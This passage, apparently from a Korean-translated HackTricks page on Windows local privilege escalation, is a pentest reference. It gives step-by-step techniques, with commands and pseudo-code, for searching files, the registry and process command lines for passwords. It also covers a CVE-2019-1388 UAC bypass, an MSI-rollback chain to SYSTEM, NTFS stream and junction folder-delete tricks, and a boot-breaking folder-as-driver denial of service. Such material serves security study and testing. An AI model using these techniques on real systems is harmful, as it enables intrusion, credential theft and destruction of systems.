{{#endref}}

### **파일 및 레지스트리에서의 일반적인 비밀번호 검색**

**파일 내용 검색**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**특정 파일명으로 파일 검색하기**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry에서 key names 및 passwords 검색**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### 비밀번호를 검색하는 도구들

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf 플러그인입니다**. 이 플러그인은 피해자 시스템 내부에서 자격 증명을 찾는 모든 **metasploit POST module을 자동으로 실행**하도록 만들어졌습니다.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) 는 이 페이지에 언급된 비밀번호를 포함하는 모든 파일을 자동으로 검색합니다.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) 는 시스템에서 비밀번호를 추출하는 또 다른 유용한 도구입니다.

이 도구 [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) 는 이 데이터를 평문으로 저장하는 여러 도구(PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)의 **세션**, **사용자 이름** 및 **비밀번호**를 검색합니다.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

한 프로세스가 SYSTEM 권한으로 실행되면서 `OpenProcess()`로 **full access** 권한을 가진 새 프로세스를 연다고 가정해보자. 동일한 프로세스가 `CreateProcess()`로 **낮은 권한이지만 메인 프로세스의 모든 열린 핸들을 상속받는 새 프로세스**도 생성한다.  
그런 다음, 만약 당신이 그 낮은 권한 프로세스에 대해 **full access**를 가지고 있다면, `OpenProcess()`로 생성된 권한 있는 프로세스에 대한 **열린 핸들**을 획득해 **shellcode**를 주입할 수 있다.  
[이 취약점을 **감지하고 악용하는 방법**에 대한 자세한 정보는 이 예제를 읽어보자.](leaked-handle-exploitation.md)  
[권한 수준(단순한 full access뿐만 아니라 서로 다른 권한 레벨로 상속된 프로세스 및 스레드의 더 많은 열린 핸들을 테스트하고 악용하는 방법)에 대해 더 완전한 설명을 제공하는 **다른 포스트**는 여기에서 읽어보자.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/)

## Named Pipe Client Impersonation

공유 메모리 세그먼트, 즉 **pipes**는 프로세스 간 통신과 데이터 전송을 가능하게 한다.

Windows는 **Named Pipes**라는 기능을 제공하여 관련 없는 프로세스들끼리도 심지어 서로 다른 네트워크 상에서 데이터를 공유할 수 있게 한다. 이는 client/server 아키텍처와 유사하며, 역할은 **named pipe server**와 **named pipe client**로 정의된다.

클라이언트가 파이프를 통해 데이터를 전송할 때, 해당 파이프를 설정한 **서버**는 필요한 **SeImpersonate** 권한이 있다면 **클라이언트의 신원으로 가장(take on the identity)**할 수 있다. 파이프를 통해 통신하는 **권한 있는 프로세스(privileged process)**를 식별하고 이를 흉내낼 수 있다면, 당신이 만든 파이프와 상호작용할 때 그 프로세스의 신원을 채택함으로써 **더 높은 권한을 획득**할 기회를 얻을 수 있다. 이러한 공격을 실행하는 방법은 [**여기**](named-pipe-client-impersonation.md)와 [**여기**](#from-high-integrity-to-system)에서 확인할 수 있다.

또한 다음 도구는 **burp 같은 도구로 named pipe 통신을 가로채는(intercept)** 데 사용할 수 있다: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept)  
그리고 모든 파이프를 나열하고 확인하여 privescs를 찾는 데 사용할 수 있는 도구: [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## 기타

### Windows에서 코드가 실행될 수 있는 파일 확장자

페이지를 확인해보자: **[https://filesec.io/](https://filesec.io/)**

### **명령줄에서 비밀번호 모니터링**

사용자 권한으로 쉘을 얻었을 때, 예약된 작업이나 다른 프로세스들이 **명령줄에 자격 증명을 전달(pass credentials on the command line)**하면서 실행되고 있을 수 있다. 아래 스크립트는 프로세스의 명령줄을 2초마다 캡처하고 현재 상태를 이전 상태와 비교하여 차이점이 있으면 출력한다.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

그래픽 인터페이스(예: console 또는 RDP)에 접근할 수 있고 UAC가 활성화되어 있는 경우, 일부 Microsoft Windows 버전에서는 권한이 없는 사용자로부터 "NT\AUTHORITY SYSTEM" 같은 터미널이나 다른 프로세스를 실행할 수 있습니다.

이로 인해 동일한 취약점을 이용해 권한 상승과 UAC 우회가 동시에 가능해집니다. 또한 아무것도 설치할 필요가 없으며, 프로세스 중 사용되는 바이너리는 Microsoft에서 서명하고 발급한 것입니다.

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
이 취약점을 악용하려면 다음 단계를 수행해야 합니다:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## From Administrator Medium to High Integrity Level / UAC Bypass

이 항목을 읽어 **Integrity Levels**에 대해 알아보세요:


{{#ref}}
integrity-levels.md
{{#endref}}

그다음 **UAC 및 UAC bypasses에 대해 알아보려면** 다음을 읽으세요:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

이 블로그 포스트([**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks))와 익스플로잇 코드([**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs))에 설명된 기술입니다.

공격은 기본적으로 Windows Installer의 rollback 기능을 악용해 정상 파일을 제거(또는 교체)하는 과정에서 악성 파일로 대체하는 방식입니다. 이를 위해 공격자는 `C:\Config.Msi` 폴더를 하이재킹(hijack)할 수 있는 **malicious MSI installer**를 만들어야 하며, 이 폴더는 이후 다른 MSI 패키지의 제거(uninstallation) 시 Windows Installer가 rollback 파일을 저장하는 데 사용됩니다. rollback 파일이 악성 페이로드로 수정되도록 조작하는 것이 목표입니다.

요약된 기법은 다음과 같습니다:

1. Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)

- Step 1: Install the MSI
- Writable 폴더(`TARGETDIR`)에 무해한 파일(예: `dummy.txt`)을 설치하는 `.msi`를 만듭니다.
- 인스톨러를 **"UAC Compliant"**로 표시하여 **non-admin user**가 실행할 수 있게 합니다.
- 설치 후 파일에 대한 **handle**을 열어 둡니다.

- Step 2: Begin Uninstall
- 동일한 `.msi`를 언인스톨합니다.
- 언인스톨 프로세스는 파일들을 `C:\Config.Msi`로 옮기고 `.rbf` 파일로 이름을 바꿉니다(rollback 백업).
- 파일이 `C:\Config.Msi\<random>.rbf`가 되었는지 탐지하기 위해 `GetFinalPathNameByHandle`로 열린 파일 핸들을 **poll**합니다.

- Step 3: Custom Syncing
- `.msi`에 포함된 **custom uninstall action (`SyncOnRbfWritten`)**은:
- `.rbf`가 쓰여졌음을 신호(signal)합니다.
- 그리고 언인스톨을 계속하기 전에 다른 이벤트를 **대기(wait)** 합니다.

- Step 4: Block Deletion of `.rbf`
- 신호를 받으면 `FILE_SHARE_DELETE` 없이 `.rbf` 파일을 **열어** 삭제를 **차단**합니다.
- 그런 다음 언인스톨이 완료될 수 있도록 **다시 신호**합니다.
- Windows Installer는 `.rbf`를 삭제하지 못해서, 모든 내용을 삭제할 수 없으므로 **`C:\Config.Msi`는 제거되지 않습니다**.

- Step 5: Manually Delete `.rbf`
- 공격자는 `.rbf` 파일을 수동으로 삭제합니다.
- 이제 **`C:\Config.Msi`가 비어있어** 하이재킹할 준비가 됩니다.

> 이 시점에서, `C:\Config.Msi`를 삭제하기 위해 **SYSTEM-level arbitrary folder delete vulnerability**를 트리거하세요.

2. Stage 2 – Replacing Rollback Scripts with Malicious Ones

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- 직접 `C:\Config.Msi` 폴더를 다시 만듭니다.
- **약한 DACLs**(예: Everyone:F)를 설정하고 `WRITE_DAC` 권한으로 **handle을 열어 둡니다**.

- Step 7: Run Another Install
- 다시 `.msi`를 설치합니다. 설정:
- `TARGETDIR`: 쓰기 가능한 위치.
- `ERROROUT`: 강제 실패를 트리거하는 변수.
- 이 설치는 다시 **rollback**을 트리거하기 위해 사용되며, rollback은 `.rbs`와 `.rbf`를 읽습니다.

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW`로 `C:\Config.Msi`를 모니터링하여 새로운 `.rbs`가 생성될 때까지 대기합니다.
- 생성된 파일명을 캡처합니다.

- Step 9: Sync Before Rollback
- `.msi`에 포함된 **custom install action (`SyncBeforeRollback`)**은:
- `.rbs`가 생성되면 이벤트를 신호합니다.
- 그리고 계속하기 전에 **대기**합니다.

- Step 10: Reapply Weak ACL
- `.rbs created` 이벤트를 받은 후:
- Windows Installer는 `C:\Config.Msi`에 **강한 ACL을 다시 적용**합니다.
- 그러나 당신은 여전히 `WRITE_DAC` 핸들을 가지고 있으므로 **약한 ACL을 다시 적용할 수 있습니다**.

> ACL은 **handle 열 때만 적용**되므로 여전히 폴더에 쓸 수 있습니다.

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` 파일을 덮어써서 **가짜 rollback 스크립트**를 넣습니다. 이 스크립트는 Windows에게:
- 당신의 `.rbf` 파일(악성 DLL)을 **권한 있는 위치**(예: `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)으로 복원하라고 지시합니다.
- 또한 악성 SYSTEM-level 페이로드 DLL을 포함한 가짜 `.rbf`를 배치합니다.

- Step 12: Trigger the Rollback
- 동기화 이벤트를 신호하여 인스톨러가 재개되도록 합니다.
- 알려진 지점에서 인스톨을 **의도적으로 실패**시키기 위해 **type 19 custom action (`ErrorOut`)**가 설정되어 있습니다.
- 이것이 rollback을 시작하게 합니다.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer는:
- 당신의 악성 `.rbs`를 읽고,
- 대상 위치로 당신의 `.rbf` DLL을 복사합니다.
- 이제 **SYSTEM이 로드하는 경로에 악성 DLL이 설치**됩니다.

- Final Step: Execute SYSTEM Code
- 신뢰할 수 있는 **auto-elevated binary**(예: `osk.exe`)를 실행하여 하이재킹한 DLL을 로드하게 합니다.
- **끝**: 당신의 코드가 **SYSTEM로 실행**됩니다.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

메인 MSI rollback 기법(위의 방법)은 전체 폴더(예: `C:\Config.Msi`)를 삭제할 수 있다고 가정합니다. 그러나 취약점이 **임의 파일 삭제(arbitrary file deletion)**만 허용한다면 어떻게 할까요?

이 경우 NTFS 내부 동작을 악용할 수 있습니다: 모든 폴더는 다음과 같은 숨겨진 alternate data stream을 가지고 있습니다:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
이 스트림은 폴더의 **인덱스 메타데이터**를 저장합니다.

따라서 폴더의 **`::$INDEX_ALLOCATION` 스트림을 삭제하면**, NTFS는 파일 시스템에서 해당 폴더를 **완전히 제거합니다**.

다음과 같은 표준 파일 삭제 API를 사용하여 이 작업을 수행할 수 있습니다:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* delete API를 호출하고 있음에도 불구하고, 실제로는 **folder 자체를 삭제합니다**.

### From Folder Contents Delete to SYSTEM EoP
만약 당신의 primitive가 임의의 files/folders를 삭제할 수 없지만, **공격자가 제어하는 folder의 *contents*를 삭제할 수 있다면** 어떻게 할까요?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- oplock는 권한 있는 프로세스가 `file1.txt`를 삭제하려고 할 때 **실행을 일시 중지합니다**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. 3단계: SYSTEM 프로세스 트리거 (예: `SilentCleanup`)
- 이 프로세스는 폴더들(예: `%TEMP%`)을 스캔하여 그 안의 내용을 삭제하려 합니다.
- `file1.txt`에 도달하면 **oplock이 발동**하여 제어를 당신의 콜백으로 넘깁니다.

4. 4단계: oplock 콜백 내부 – 삭제를 재지정

- 옵션 A: `file1.txt`을 다른 곳으로 이동
- 이렇게 하면 `folder1`을 비우되 oplock을 깨지 않습니다.
- `file1.txt`을 직접 삭제하지 마세요 — 그렇게 하면 oplock이 조기에 해제됩니다.

- 옵션 B: `folder1`을 **junction**으로 변환:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- 옵션 C: `\RPC Control`에 **symlink** 생성:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> 이것은 폴더 메타데이터를 저장하는 NTFS 내부 스트림을 겨냥합니다 — 이를 삭제하면 폴더가 삭제됩니다.

5. 5단계: oplock 해제
- SYSTEM 프로세스는 계속해서 `file1.txt`를 삭제하려 시도합니다.
- 하지만 이제 junction + symlink 때문에 실제로 삭제되는 것은:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**결과**: `C:\Config.Msi`가 SYSTEM에 의해 삭제됩니다.

### Arbitrary Folder Create에서 Permanent DoS로

다음 primitive를 악용하면 **create an arbitrary folder as SYSTEM/admin**를 수행할 수 있습니다 — 설령 **파일을 쓸 수 없거나** 또는 **약한 권한을 설정할 수 없더라도**.

파일이 아니라 **folder**를 생성하고 그 이름을 **critical Windows driver**로 설정하세요. 예:
```
C:\Windows\System32\cng.sys
```
- 이 경로는 일반적으로 `cng.sys` 커널 모드 드라이버에 해당합니다.
- 만약 그 경로를 **폴더로 미리 생성하면**, Windows는 부팅 시 실제 드라이버를 로드하지 못합니다.
- 그 다음 Windows는 부팅 중에 `cng.sys`를 로드하려고 합니다.
- 폴더를 발견하면, **실제 드라이버를 찾지 못하고**, **시스템이 충돌하거나 부팅이 중단됩니다**.
- 대체 수단이 **없으며**, 외부 개입(예: 부팅 복구나 디스크 접근) 없이는 **복구가 불가능합니다**.


## **High Integrity에서 SYSTEM으로**

### **새 서비스**

이미 High Integrity 권한의 프로세스에서 실행 중이라면, **SYSTEM으로 가는 경로**는 단지 **새 서비스를 생성하고 실행하는 것**만으로도 쉽게 확보될 수 있습니다:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> 서비스 바이너리를 생성할 때, 유효한 서비스인지 또는 바이너리가 필요한 작업을 빠르게 수행하는지 확인하세요. 유효한 서비스가 아니면 20초 내에 종료됩니다.

### AlwaysInstallElevated

From a High Integrity process you could try to **enable the AlwaysInstallElevated registry entries** and **install** a reverse shell using a _**.msi**_ wrapper.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**You can** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

해당 토큰 권한을 가지고 있다면(대개 이미 High Integrity 프로세스에서 찾게 됩니다), SeDebug 권한으로 거의 모든 프로세스(Protected Process는 제외)를 열고, 프로세스의 토큰을 복사하여 그 토큰으로 임의의 프로세스를 생성할 수 있습니다.\
이 기술은 보통 SYSTEM으로 실행 중이며 모든 토큰 권한을 가진 프로세스 중 하나를 선택해서 사용합니다 (_네, 모든 토큰 권한이 없는 SYSTEM 프로세스도 있을 수 있습니다_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

이 기술은 meterpreter가 `getsystem`으로 권한 상승할 때 사용됩니다. 기술의 핵심은 **파이프를 생성한 후 서비스를 생성/악용해 그 파이프에 쓰게 하는 것**입니다. 그런 다음, 해당 파이프를 생성한 **서버**가 **`SeImpersonate`** 권한을 사용하면 파이프 클라이언트(서비스)의 토큰을 **임퍼손네이트**하여 SYSTEM 권한을 얻을 수 있습니다.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

만약 **SYSTEM으로 실행되는 프로세스가 로드하는 dll을 hijack**할 수 있다면 해당 권한으로 임의 코드를 실행할 수 있습니다. 따라서 Dll Hijacking은 이러한 권한 상승에도 유용하며, 특히 High Integrity 프로세스에서는 DLL을 로드하는 폴더에 **쓰기 권한**이 있으므로 달성하기가 훨씬 쉽습니다.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

Windows 로컬 권한 상승 벡터를 찾기 위한 최고의 도구: [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- 잘못된 구성 및 민감한 파일 점검 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). 탐지됨.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- 일부 가능한 잘못된 구성 점검 및 정보 수집 (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- 잘못된 구성 검사**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla 및 RDP 저장 세션 정보를 추출합니다. 로컬에서는 -Thorough 옵션 사용.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager에서 자격 증명 추출. 탐지됨.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- 수집한 암호를 도메인 전체에 스프레이합니다**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh는 PowerShell 기반 ADIDNS/LLMNR/mDNS/NBNS 스푸퍼 및 중간자 공격 도구입니다.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- 기본적인 privesc용 Windows 열거**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- 알려진 privesc 취약점 검색 (Watson으로 대체되어 사용 중단)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- 로컬 검사 **(관리자 권한 필요)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc 취약점 검색 (VisualStudio로 컴파일 필요) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- 호스트를 열거하여 잘못된 구성을 찾음 (정보 수집 도구에 가깝고 privesc 목적보다는 더 적합) (컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 다양한 소프트웨어에서 자격 증명 추출 (GitHub에 precompiled exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 이식 버전**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- 잘못된 구성 점검 (GitHub에 실행 파일 있음). 권장하지 않음. Windows 10에서 잘 작동하지 않음.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 잘못된 구성 점검 (python으로 만든 exe). 권장하지 않음. Windows 10에서 잘 작동하지 않음.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 글을 기반으로 만든 도구 (정상 동작에 accesschk가 필요하지 않지만 사용할 수 있음).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력값을 읽어 작동 가능한 익스플로잇을 추천 (로컬 python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력값을 읽어 작동 가능한 익스플로잇을 추천 (로컬 python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

You have to compile the project using the correct version of .NET ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). To see the installed version of .NET on the victim host you can do:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## 참고자료

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)

{{#include ../../banners/hacktricks-training.md}}
